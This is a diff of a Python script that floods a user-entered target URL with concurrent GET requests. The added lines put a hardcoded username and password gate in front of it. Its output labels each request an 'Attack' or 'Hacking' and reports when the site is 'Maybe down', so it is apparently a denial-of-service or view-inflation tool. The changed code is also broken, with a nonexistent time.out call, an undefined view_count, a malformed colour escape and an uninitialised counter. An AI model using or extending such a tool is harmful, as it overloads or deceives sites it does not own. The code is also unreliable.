@@ -39,20 +39,32 @@ print("""
 ║\033[37m                               ——o0o——                           \033[31m║
 ╚═════════════════════════════════════════════════════════════════╝
 """)
+while attemps < 100:
+    username = input("\033[38;5;2mUsername: \033[0m")
+    password = input("\033[38;5;2mPpassword: \033[0m")
 
-ask = fade.pinkred("\033[33m==⟩⟩ RUN SC BUTUH WKT 35 DETIK DG TARGET URL: \033[0m")
+    if username == 'querty' and password == 'querty':
+        print("\033[48;5;7m═⟩⟩ \033[0m")
+        break
+    else:
+        print('Incorrect credentials. Check if you have Caps lock on and try again.')
+        attemps += 1
+        continue
+
+ask = fade.pinkred("\033[48;5;7m═⟩⟩ URL:\033[0m \033[32m\033[0m")
 url = input(ask)
-print("\033[96mMOHON BERSABAR KARENA INI BUKAN UJIAN..! 🤭\033[0m")
+print("\033[32mLoading......")
 
 async def increment_view_count(session):
     try:
         async with session.get(url) as response:
             if response.status == 200:
-                print("\033[95m[💥] \033[96mHUDAIRUL-AQSHA \033[97m Attack \033[33m" +str(url)+ "  \033[31mHacking\033[0m")
+                time.out(0.02)
+                print("\033[48;5;3mInfo target \033[0m \033[33m" +str(url)+ " \033[35work\033[0m")
             else:
-                print("\033[33m[*] \033[33mHUDAIRUL-AQSHA \033[36m Attack  \033[35m" +str(url)+ "  \033[93mHacking\033[0m")
+                print("\033[48;5;3mInfo target \033[0m \033[33m" +str(view_count)+ " \033[35work\033[0m")
     except aiohttp.ClientError as e:
-            print("\033[31m[!] \033[32mHUDAIRUL-AQSHA \033[31m Attack  \033[33m" +str(url)+ "  \033[37mMaybe down!\033[0m")
+            print("\033[33m" +str(url)+ "  \033[37mMaybe down!\033[0m")
 
 async def main():
     connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
